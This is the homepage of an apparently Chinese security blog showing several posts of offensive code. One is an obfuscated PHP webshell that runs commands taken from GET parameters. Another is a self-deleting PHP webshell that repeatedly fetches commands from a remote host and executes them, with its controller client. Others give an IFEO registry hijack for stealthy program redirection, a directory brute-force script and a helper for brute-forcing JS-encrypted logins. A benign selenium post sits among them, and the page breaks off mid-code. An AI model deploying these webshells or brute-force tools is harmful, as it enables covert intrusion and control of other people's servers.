<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="Zh/Cn">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta name="description" content="一束光照进了铁塔，塔里的肮脏龌龊被显现，这束光便有了罪。">
<meta property="og:type" content="website">
<meta property="og:title">
<meta property="og:url" content="http://yangge.me/index.html">
<meta property="og:site_name">
<meta property="og:description" content="一束光照进了铁塔，塔里的肮脏龌龊被显现，这束光便有了罪。">
<meta property="og:locale" content="Zh/Cn">
<meta name="twitter:card" content="summary">
<meta name="twitter:title">
<meta name="twitter:description" content="一束光照进了铁塔，塔里的肮脏龌龊被显现，这束光便有了罪。">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yangge.me/"/>





  <title></title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="Zh/Cn">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title"></span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            Archives
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yangge.me/2018/07/26/Untitled/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="yangge">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="https://i.loli.net/2018/01/29/5a6ec351ca6e7.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/07/26/Untitled/" itemprop="url">php无特征webshell（get_defined_functions函数）</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-07-26T14:32:59+08:00">
                2018-07-26
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2018/07/26/Untitled/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count"
                        data-disqus-identifier="2018/07/26/Untitled/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>该函数的php.net介绍<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://php.net/manual/zh/function.get-defined-functions.php</span><br></pre></td></tr></table></figure></p>
<p>具体可以到里面看，其实就是返回了所有定义的函数，包括自定义及内置的函数，那么我们就可以通过该函数进行调用比如一些exec，system等函数，从而达到无特征webshell。<br>其实这里还是有点小问题，就是说，可能返回的函数名数组的位置可能不是固定的，可能需要我们测试目标上的是否和本地的位置为一致的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function callfunc()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    $func = get_defined_functions();  //函数自己完成所有函数的枚举，成为list</span><br><span class="line">    $args = func_get_args();  //获取传入参数值</span><br><span class="line">    $func_id = array_shift($args);  //获取传入的函数所代表的list key</span><br><span class="line">    $func_name = $func[&apos;internal&apos;][$func_id];  //以key来索引函数名</span><br><span class="line"></span><br><span class="line">    return call_user_func_array($func_name, $args);  //调用回调函数，传参执行</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print callfunc(1076, &quot;whoami&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>我的exec位置在1076，大家可以自己echo一下get_defined_functions()，看看自己的exec在什么位置。</p>
<p>demo如上，那么我们就可以按照使用get_defined_functions()的思路来把所有的函数名称替换一下。<br>其中，我的各个函数的位置如图：</p>
<p><img src="https://i.loli.net/2018/07/26/5b5970cd2807b.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function f()</span><br><span class="line">&#123;</span><br><span class="line">    $a = get_defined_functions()[&apos;internal&apos;];</span><br><span class="line">    $s = $a[3](); //func_get_args();</span><br><span class="line">    $b = $a[1427]($s); //array_shift($s);</span><br><span class="line">    $c = $a[$b]; //$func[&apos;internal&apos;][$b];</span><br><span class="line">    return $a[1178]($c, $s);//return call_user_func_array($func_name, $args);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print f($_GET[&apos;id&apos;], $_GET[&apos;cmd&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2018/07/26/5b5976fc20ea7.png" alt=""></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yangge.me/2018/07/16/映像劫持/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="yangge">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="https://i.loli.net/2018/01/29/5a6ec351ca6e7.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/07/16/映像劫持/" itemprop="url">映像劫持</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-07-16T14:39:09+08:00">
                2018-07-16
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2018/07/16/映像劫持/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count"
                        data-disqus-identifier="2018/07/16/映像劫持/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h4 id="什么是映像劫持？"><a href="#什么是映像劫持？" class="headerlink" title="什么是映像劫持？"></a>什么是映像劫持？</h4><p>映像劫持（Image File Execution Options），简单的说法，就是当你打开的是程序A，而运行的确是程序B。</p>
<p>利用GFlages.exe来使映像劫持更好玩。<br>下载地址：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://download.microsoft.com/download/A/6/A/A6AC035D-DA3F-4F0C-ADA4-37C8E5D34E3D/setup/WinSDKDebuggingTools_amd64/dbg_amd64.msi</span><br></pre></td></tr></table></figure></p>
<p>用法如图</p>
<p><img src="/images/pasted-0.png" alt=""></p>
<p>作用是关闭notepad.exe 以后自动打开calc.exe</p>
<p>一键添加注册表脚本：<br>保存为test.reg<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"></span><br><span class="line">[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe]</span><br><span class="line"></span><br><span class="line">&quot;GlobalFlag&quot;=dword:00000200</span><br><span class="line"></span><br><span class="line">[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe]</span><br><span class="line"></span><br><span class="line">&quot;MonitorProcess&quot;=&quot;C:\\WINDOWS\\system32\\calc.exe&quot;</span><br><span class="line">&quot;ReportingMode&quot;=dword:00000001</span><br></pre></td></tr></table></figure></p>
<p>还可以进行多跳操作，来隐藏真正的程序。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yangge.me/2018/07/11/POC-T使用/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="yangge">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="https://i.loli.net/2018/01/29/5a6ec351ca6e7.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/07/11/POC-T使用/" itemprop="url">POC-T使用</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-07-11T15:30:33+08:00">
                2018-07-11
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2018/07/11/POC-T使用/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count"
                        data-disqus-identifier="2018/07/11/POC-T使用/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>今天中午偷偷和26师傅学了一招，以后写poc就不用管多线程的问题了，美滋滋~</p>
<h4 id="POC-T"><a href="#POC-T" class="headerlink" title="POC-T"></a>POC-T</h4><p>github: <a href="https://github.com/Xyntax/POC-T" target="_blank" rel="noopener">https://github.com/Xyntax/POC-T</a></p>
<p>里面已经写的很清楚了，写一个例子就好了，比如我们要写一个爆破网站目录的脚本，直接放到目录下的script中，其中定义一个poc的函数，程序就会自己调用。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(dictionares)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = <span class="string">'http://www.360.cn/'</span>+dictionares</span><br><span class="line">        headers = &#123;<span class="string">'Connection'</span>:<span class="string">'close'</span>&#125;</span><br><span class="line">        re = requests.head(url,headers=headers)</span><br><span class="line">        <span class="keyword">if</span>(re.status_code==<span class="number">200</span>):</span><br><span class="line">            <span class="keyword">return</span> url</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br></pre></td></tr></table></figure>
<p>使用方式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python POC-T.py -s scantest -t 100 -iF ~/Desktop/php.txt</span><br></pre></td></tr></table></figure></p>
<p>-s 后面加脚本名称 -t 线程数量 -iF 加字典，完全ok<br><img src="https://i.loli.net/2018/07/11/5b45b47e75326.jpg" alt=""></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yangge.me/2018/06/04/php无文件webshell/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="yangge">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="https://i.loli.net/2018/01/29/5a6ec351ca6e7.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/06/04/php无文件webshell/" itemprop="url">php无文件webshell</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-06-04T17:56:49+08:00">
                2018-06-04
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2018/06/04/php无文件webshell/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count"
                        data-disqus-identifier="2018/06/04/php无文件webshell/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>无文件webshell,就是执行完驻留内存中，主要是利用函数 ignore_user_abort。</p>
<h4 id="webshell："><a href="#webshell：" class="headerlink" title="webshell："></a>webshell：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">unlink($_SERVER[&apos;SCRIPT_FILENAME&apos;]);</span><br><span class="line">ignore_user_abort(true);</span><br><span class="line">set_time_limit(0);</span><br><span class="line">$remote_file = &apos;http://192.168.192.1:8888/shell.txt&apos;;</span><br><span class="line">while($code = file_get_contents($remote_file))&#123;</span><br><span class="line">  exec($code);</span><br><span class="line">  sleep(5);</span><br><span class="line">  unlink(&apos;1.txt&apos;);</span><br><span class="line">&#125;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>我写了一个客户端，就可以直接调用了。</p>
<h4 id="client"><a href="#client" class="headerlink" title="client"></a>client</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">sys_shell = sys.argv[1]</span><br><span class="line">get_shell1 = sys.argv[2]</span><br><span class="line">file = open(&apos;shell.txt&apos;,&apos;w&apos;)</span><br><span class="line">sys_shell1 = sys_shell+&apos;&gt;1.txt&apos;</span><br><span class="line">file.write(sys_shell1)</span><br><span class="line">file.close()</span><br><span class="line">get_shell = &quot;curl &quot;+get_shell1+&quot;/1.txt&quot;</span><br><span class="line">time.sleep(5)</span><br><span class="line">dd = os.popen(get_shell).read()</span><br><span class="line">while True:</span><br><span class="line">    if &apos;404&apos; in dd:</span><br><span class="line">        continue</span><br><span class="line">    else:</span><br><span class="line">        print(dd)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>
<p>先在vps运行client.py<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python client.py whoami http://2.2.2.2</span><br></pre></td></tr></table></figure></p>
<p>然后在被控机器上运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php shell.php</span><br></pre></td></tr></table></figure></p>
<p>client.py 那个ip要和shell.php在同一个文件夹</p>
<p><img src="https://i.loli.net/2018/06/04/5b150f38e5b22.jpg" alt=""></p>
<p>如果想结束所有进程，只要把client下的shell.txt文件删除，或者置空就可以了。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yangge.me/2018/05/28/selenium进行自动化任务/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="yangge">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="https://i.loli.net/2018/01/29/5a6ec351ca6e7.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/05/28/selenium进行自动化任务/" itemprop="url">selenium进行自动化任务</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-05-28T16:19:39+08:00">
                2018-05-28
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2018/05/28/selenium进行自动化任务/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count"
                        data-disqus-identifier="2018/05/28/selenium进行自动化任务/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>有些任务，我们可能必须通过人工通过浏览器来进行测试，比如有些银行的app会校验证书，而且我们抓到的包是加密过的，那么我们就只能在app的页面上做测试，但是还是有一种办法进行自动化测试，就是selennium。</p>
<p>python + selennium网上大量的教程，就不详细说明了，主要是对于元素的抓取上，比较麻烦，在网上查找资料找到了一个chrome插件katalon，可以帮助我们查找元素。<br>直接看图，就可以看出来</p>
<p><img src="https://i.loli.net/2018/05/28/5b0bcd55a5ad1.gif" alt="111.gif"><br>。。。调了半个小时gif图，还是没法播放，想看的另存为吧。。<br>然后我们可以根据这些元素直接进行编写，还有一种更方便的，因为这个插件已经帮我们写好了，虽然是python2的，但是也能用。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_</span><span class="params">(self)</span>:</span></span><br><span class="line">        driver = self.driver</span><br><span class="line">        driver.get(<span class="string">"https://www.baidu.com/"</span>)</span><br><span class="line">        driver.find_element_by_id(<span class="string">"kw"</span>).click()</span><br><span class="line">        driver.find_element_by_id(<span class="string">"kw"</span>).clear()</span><br><span class="line">        driver.find_element_by_id(<span class="string">"kw"</span>).send_keys(<span class="string">"nihao"</span>)</span><br><span class="line">        driver.find_element_by_id(<span class="string">"su"</span>).click()</span><br></pre></td></tr></table></figure></p>
<p>我们把这个函数中的代码截出来，就可以进行自己想要的操作了，比如循环什么的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import time</span><br><span class="line">from selenium import webdriver</span><br><span class="line"></span><br><span class="line">driver = webdriver.Chrome()</span><br><span class="line">driver.get(&quot;https://www.baidu.com/&quot;)</span><br><span class="line">test = [&apos;222&apos;,&apos;333&apos;,&apos;444&apos;]</span><br><span class="line">for i in test:</span><br><span class="line">   driver.find_element_by_id(&quot;kw&quot;).click()</span><br><span class="line">   driver.find_element_by_id(&quot;kw&quot;).clear()</span><br><span class="line">   driver.find_element_by_id(&quot;kw&quot;).send_keys(i)</span><br><span class="line">   driver.find_element_by_id(&quot;su&quot;).click()</span><br></pre></td></tr></table></figure></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yangge.me/2018/05/22/js加密的爆破方式/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="yangge">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="https://i.loli.net/2018/01/29/5a6ec351ca6e7.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/05/22/js加密的爆破方式/" itemprop="url">js加密的爆破方式</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-05-22T15:45:22+08:00">
                2018-05-22
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2018/05/22/js加密的爆破方式/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count"
                        data-disqus-identifier="2018/05/22/js加密的爆破方式/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h6 id="之前在工作中，碰到很多利用js加密的密码，然后没有验证码，我们就可以想个办法来进行加密后发包，就可以达到爆破的效果。"><a href="#之前在工作中，碰到很多利用js加密的密码，然后没有验证码，我们就可以想个办法来进行加密后发包，就可以达到爆破的效果。" class="headerlink" title="之前在工作中，碰到很多利用js加密的密码，然后没有验证码，我们就可以想个办法来进行加密后发包，就可以达到爆破的效果。"></a>之前在工作中，碰到很多利用js加密的密码，然后没有验证码，我们就可以想个办法来进行加密后发包，就可以达到爆破的效果。</h6><p>有几种方式是可以进行操作的：</p>
<ul>
<li>破解加密算法,逆向一个</li>
<li>模拟加密算法自己写一个</li>
<li>调用加密js文件</li>
</ul>
<p>前两个有点难，而且有点麻烦，并且没有规律性，就不看了，只看最后一个。</p>
<p>利用nodejs来调用加密js文件，网上都写的很详细，直接粘代码记录下</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);  </span><br><span class="line"><span class="keyword">var</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>);</span><br><span class="line"><span class="keyword">var</span> rsa = <span class="built_in">require</span>(<span class="string">'./rsa2'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">enc</span>(<span class="params">pass</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> rsapubkey=<span class="string">"-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC5FvP6Z/qKeOScNctnEb59A1gvRx5AZJytri9UW3ggf1fYhjZ+I8y0dwh25V45GxfbIxfNwIaYRI0vb1NpUhCUi5gry65hNkVegQh8wT0p8+vAq8JBxEKG98m/ZuVy/+jtLkH7EPtXYxz3LJrULsS8gwb4pJ9HC+DgTbUMTc17KwIDAQAB-----END PUBLIC KEY-----"</span>;</span><br><span class="line">  <span class="keyword">var</span> enc = rsa(rsapubkey, pass);</span><br><span class="line">  <span class="keyword">return</span> enc</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http.createServer(<span class="function"><span class="keyword">function</span> (<span class="params">request, response</span>) </span>&#123;  </span><br><span class="line">	<span class="keyword">var</span> q =url.parse(request.url,<span class="literal">true</span>)</span><br><span class="line">  <span class="keyword">var</span> pass = q.query.pass</span><br><span class="line"> <span class="keyword">var</span> pass= <span class="built_in">String</span>(pass)</span><br><span class="line">  response.writeHead(<span class="number">200</span>, &#123;<span class="string">'Content-Type'</span>: <span class="string">'text/plain'</span>&#125;);  </span><br><span class="line">  <span class="keyword">var</span> data = <span class="built_in">JSON</span>.stringify(enc(pass))</span><br><span class="line">  response.end(data);  </span><br><span class="line">&#125;).listen(<span class="number">8881</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">console</span>.log(<span 